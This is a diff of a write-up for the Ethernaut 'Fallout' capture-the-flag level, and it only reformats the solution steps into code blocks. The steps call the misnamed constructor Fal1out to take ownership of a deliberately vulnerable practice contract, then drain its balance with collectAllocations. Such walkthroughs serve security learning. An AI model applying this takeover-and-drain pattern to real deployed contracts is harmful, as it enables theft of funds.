@@ -59,9 +59,31 @@ contract Fallout {
 
 ## Writeup
 1. Get new instance
-2. `await contract.owner()` to check contract owner, it return address 0x0000000000000000000000000000000000000000.
-3. Use `await contract.allocatorBalance(YOUR_ADDRESS).then(v=>v.toString())` to check balance, it return zero.
-4. `await contract.Fal1out({ value: toWei("0.00001") })`
-5. Call function `allovatorBalance` again like step3, we can see out balance become 10000000000000 now.
-6. `await contract.collectAllocations()`
+2. Call the method
+    ``` solidity
+
+    await contract.owner()
+    
+    ```
+    to check contract owner, it return address 0x0000000000000000000000000000000000000000.
+3. Call the method
+    ``` solidity
+
+    await contract.allocatorBalance(YOUR_ADDRESS).then(v=>v.toString())
+
+    ```
+    to check balance, it will return zero.
+4. Call the method
+    ``` solidity
+
+    await contract.Fal1out({ value: toWei("0.00001") })
+
+    ``` 
+5. Call method `allovatorBalance` again like step3, we can see out balance become 10000000000000 now.
+6. Call the method
+    ``` solidity
+
+    await contract.collectAllocations()
+
+    ```
 7. Submit instance ξ( ✿＞◡❛)
